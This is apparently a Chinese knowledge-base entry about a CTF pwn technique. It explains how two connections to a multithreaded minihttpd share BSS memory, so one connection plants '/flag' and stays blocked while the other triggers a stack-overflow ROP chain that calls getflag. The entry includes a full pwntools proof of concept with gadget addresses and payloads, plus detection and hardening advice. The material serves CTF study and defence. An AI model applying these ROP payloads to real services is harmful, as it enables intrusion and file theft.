---
id: binary-pwn-stack-multithread-http-cross-connection-bss-reuse
title: 多线程 HTTP 服务跨连接共享 BSS：一条连接写入 /flag 并保活，另一条连接复用完成 ROP 读文件
type: scenario
domain: binary
path: binary/pwn/stack
technique: multithread-cross-connection-bss-state-reuse
tags:
- pwn
- multithread
- pthread
- bss
- cross-connection
- http
- rop
- shared-state
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:35+08:00'
  notes: 已对照原文题解2 两条连接脚本核对；线程栈独立/BSS 共享与 fd 路由一致；PoC 未复跑。
url: /docs/binary/pwn/stack/binary-pwn-stack-multithread-http-cross-connection-bss-reuse/
draft: false
kb_aliases:
- 跨连接共享 BSS
- 多线程服务 pwn
- 线程共享全局数据
- 连接保活
- 两连接利用
- cross-connection BSS reuse
---

## 一句话结论

在多线程、每连接一个 worker 的服务里，各线程栈是独立的，但同一进程的 BSS/全局区共享；当单条连接的栈溢出 payload 不好同时承载“需要固定地址的数据”和“后续链”时，可以让连接 A 溢出后把数据（如 `"/flag"`）写进共享 BSS 并停在 `recv` 保活，再由连接 B 触发同一溢出，用固定 BSS 地址引用 A 写入的数据调用 getflag/文件读取函数，把 flag 读出来。

## 原理

- **线程共享的是地址空间，不是栈**：`pthread_create` 创建的 worker 各有独立栈，原文“多个线程公用一个栈”的表述不准确；但 `.bss`、`.data`、堆和已打开 fd 表属于整个进程，一个线程写入的全局缓冲区，其他线程按同一虚拟地址可见。跨连接复用的正是这部分共享内存。
- **主线程继续 accept**：worker 阻塞在 `recv` 不会阻止监听线程接受新连接，所以连接 A 可以长期停住，进程和 BSS 内容都不会被清理。
- **每次连接都给一次溢出机会**：minihttpd 的 `/setmode` 处理把 `=` 后的值按请求长度拷入 0x10 字节栈缓冲区，任意一条连接都能触发同一个栈溢出；无 PIE 时 BSS 地址固定。
- **连接 A 负责“种数据并保活”**：A 的第一段 ROP 把 saved rbp 设为 `bss`，跳到程序内的 recv 调用点，把 `"/flag\0\0\0" + 链` 写入 BSS；该链末尾再次以 `rsi=bss`、`rdi=fd_A` 调用同一个 recv 调用点，于是 A 的 worker 阻塞等待更多数据，BSS 开头保留 `/flag`。只要 A 不再发送数据，阻塞中的 `recv` 不会覆盖这 8 字节。
- **连接 B 负责“复用并触发”**：B 再次触发溢出，链为 saved rbp=`bss`、`pop rsi` → `bss`（复用 A 写入的 `/flag`）、`pop rdi` → `fd_target`、`getflag`。B 的 payload 不需要包含文件名字符串，也不需要二阶段 recv，因此更短、只依赖已存在的全局数据。
- **fd 决定 flag 回到哪条连接**：`accept` 返回最小可用 fd；0/1/2 是标准流，3 通常是监听 socket，A 一般是 4，B 一般是 5。`getflag(fd, filename)` 内部用 `send(fd, ...)`，所以 flag 显示在哪条连接完全由 ROP 里的 fd 决定：传 4 就回到 A 的 socket，传 5 才回到 B。原文输出脚本传 4，而准备脚本正占用 4，因此 flag 实际出现在准备脚本的连接上——这正是原文“需要注意 fd 的控制”的含义。
- **可靠性边界**：A 必须保持连接（否则 fd 可能被 B 复用，语义变化）；B 的溢出只写自己的线程栈，不会覆盖 BSS 里的 `/flag`；若 B 的 payload 也做 recv 二阶段写到同一 BSS，会覆盖字符串，所以 B 应直接用现成数据。

## 触发条件

- 服务为每连接 `pthread_create`（不是多进程；多进程地址空间不共享，此技巧不成立），且 worker 的栈溢出在每次连接都可触发。
- BSS/全局缓冲区地址固定（无 PIE 或已泄露），一个线程写入后不会被清零、复用或按请求重新初始化。
- 溢出链能在写入数据后让 worker 停在 `recv`/`read` 而不退出，同时主线程仍能 `accept`。
- 攻击者可保持至少两条连接，并能推算/控制 `accept` 分配到的 fd 顺序。
- 存在以固定地址字符串为参数的 helper（getflag、文件读取回写函数），或后续链可直接引用全局数据。

## 利用步骤

1. 确认线程模型（每连接 `pthread_create`）、共享的 BSS/全局缓冲区、`/setmode` 溢出偏移、gadget、`getflag` 地址与 fd 分配顺序。
2. 连接 A 发送第一段溢出，并紧跟第二段 `"/flag\0\0\0" + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(pop_rdi) + p64(fd_A) + p64(ret) + p64(recv_callsite)`。第一段 recv 把第二段写入 BSS；随后 `leave; ret` 从 BSS+8 执行，`pop rbp` 吃掉 `/flag` 字符串，链设好 `rsi=bss`、`rdi=fd_A` 后再次进入 recv，线程 A 阻塞，BSS 保留 `/flag`。
3. 保持 A 连接不关闭、不再发送数据；确认服务仍在监听。
4. 连接 B 发送溢出 payload：`b"setmode=" + b"a"*0x440 + p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(pop_rdi) + p64(fd_target) + p64(getflag)`；`rsi=bss` 引用 A 写的 `/flag`，`fd_target` 选 A 或 B 的 fd。
5. 在 `fd_target` 对应的连接读取 flag；若传 A 的 fd 就在 A 读，若想在本连接读就传 B 的 fd。
6. 失败排查：A 是否仍连接、BSS 是否被后续 recv 覆盖、fd 是否符合 accept 顺序、B 的溢出是否因长度/canary 提前崩溃。

## PoC

两条连接的顺序脚本（地址为原题示例，未在本机复跑）：

```python
from pwn import *
context.arch = 'amd64'

pop_rdi       = 0x402ff3   # pop rdi ; ret
pop_rsi_r15   = 0x402ff1   # pop rsi ; pop r15 ; ret
ret           = 0x402ff4   # 栈对齐
recv_callsite = 0x401cf0   # mov ecx,0 ; mov rdx,rax ; call _recv
getflag       = 0x402663   # fopen(filename,"r") -> fread -> send(fd,...)
bss           = 0x427000
post          = b'POST /setmode\r\nContent-Length: %d\r\n\n'

# 连接 A（fd 4）：写入 /flag，然后再次 recv 保活
a = remote('localhost', 9999)
a1  = b'setmode=' + b'a' * 0x440
a1 += p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0)
a1 += p64(pop_rdi) + p64(4) + p64(ret) + p64(recv_callsite)
a2  = b'/flag\x00\x00\x00'
a2 += p64(pop_rsi_r15) + p64(bss) + p64(0)
a2 += p64(pop_rdi) + p64(4) + p64(ret) + p64(recv_callsite)  # 阻塞在此，bss 保留 /flag
a.send((post % len(a1)) + a1 + a2)

# 连接 B（fd 5）：复用 A 写入的 /flag；getflag 的 fd=4 让 flag 回到 A
b = remote('localhost', 9999)
b1  = b'setmode=' + b'a' * 0x440
b1 += p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0)
b1 += p64(pop_rdi) + p64(4) + p64(getflag)
b.send((post % len(b1)) + b1)

print(a.recvline(timeout=3))   # flag 实际从 A 的连接返回
# 若希望 B 接收，把 B 链中 getflag 前的 p64(4) 改为 p64(5)
```

关键点：A 的第二次 recv 长度取自上一次 recv 的返回值（即第二段长度），足够但不会主动写；A 保持沉默时 BSS 中的 `/flag` 不会被覆盖。B 只读共享 BSS，不写它。

## 变体与关联

- 变体：A 不一定要停在 recv；任何能让 worker 阻塞又不清理全局区的调用（`read`、`accept`、条件等待）都可保活；也可让 A 正常返回但服务不清空全局缓冲区。
- 变体：共享数据可以是文件名、命令字符串、`/bin/sh`、结构体或伪造对象；只要地址固定且后续连接能引用。
- 变体：若服务是多进程而非多线程，BSS 不共享，需要换用共享内存、文件或环境变量等 IPC 载体。
- 变体：fd 不可预测时，可在 B 的链中循环尝试多个 fd，或先关闭/占位 fd 以固定 accept 分配。
- 关联：[[binary-pwn-stack-minihttpd-setmode-overflow-ret2getflag]]（同一 minihttpd 题的单连接解法：recv 二阶段写 BSS + 内置 getflag）；[[binary-pwn-stack-pivot-leave-ret-bss]]（leave;ret 迁移基础）；[[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]（BSS 迁移与分块写链）；[[binary-pwn-rop-magic-gadget-csu-bss-write-orw-no-libc-leak]]（同题用 magic gadget 写 BSS 的另一解法）。
- 边界：线程栈独立，不能靠“共享栈”跨连接传 ROP 链；共享的只能是 BSS/堆等进程级内存。连接 A 的 fd 被复用时（A 断开后 B 可能拿到 4），fd 语义会改变，脚本需按实际 accept 顺序调整。

## 检测与防御

- 修复：`/setmode` 的 value 拷贝按缓冲区容量截断并校验 `Content-Length`；不要在全局缓冲区保存跨请求敏感数据，或每请求清零。
- 编译加固：开启 PIE/ASLR 使 BSS 地址不可预测，配合 Canary、NX、Full RELRO、CET。
- 服务设计：worker 阻塞不应无限占用连接；设置连接/线程上限与超时；避免把文件读取 helper 暴露为可 ROP 调用的固定地址函数。
- 检测：同一进程内多条连接出现相同 `/setmode` 超长 body；一条 worker 长期阻塞在 recv/read 而另一条连接触发溢出；BSS 中出现 `/flag` 等字符串；`getflag`/`send` 被异常调用且 fd 指向其他连接。
